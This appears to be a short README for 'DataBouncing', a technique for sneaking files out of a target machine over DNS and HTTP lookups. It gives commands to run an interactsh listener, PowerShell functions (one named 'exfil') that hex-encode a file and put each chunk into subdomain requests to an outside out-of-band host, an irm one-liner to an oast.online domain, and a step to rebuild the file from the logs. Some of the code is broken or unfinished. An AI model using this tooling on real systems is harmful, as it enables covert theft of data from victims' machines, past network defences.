# DataBouncing

You have two options. 
Use the [InteractSh Web Client](https://app.interactsh.com/#/) or 
use this [Build Script](https://github.com/Unit-259/DataBouncing/blob/main/Resources/interactshBuild.sh) with an Ubuntu 22.04 image.

Run this command on your listener machine to start the InteractSh Client and define your log file

```
interactsh-client -v -o /root/DataBouncing/logs.txt
```

Next on the target machine you are going to want to convert a file to Hex and prepare it for transfer with this script:
[chunks](https://github.com/Unit-259/DataBouncing/blob/main/Client/Convert-FileToHexChunks.ps1)

```powershell

function exfil {
    param (
        [string]xregex,
        [string]$domain,
        [string]$url
    )
    $segments = Convert-FileToHexChunks -FilePath .\file.txt
    foreach ($segment in $segments.PSObject.Properties) {
        $secret = $segment.Value;
        send-customRequest -Url "$regex.$url" -Domain "$domain"    
    }
}
```





```
function Demo-Secrets {
    param (
        [string]$xregex,
        [string]$urlSuffix
    )

    foreach ($segment in $segments.PSObject.Properties) {
        $secret = $segment.Value
        $url = "$xregex.$secret.$urlSuffix"
        Send-CustomRequest $url
    }
}
```

```
irm "xregex.$secret.cln0jgqilvdjjg1nk8d0ksttdzkd7waij.oast.online"
```



```
Convert-hexToAscii (find-secret -FilePath ./logs.txt -XRegex 'xregex')
```

```
# 1. Convert File to hex 
# 2. segment with numbers 
# 3. 
```
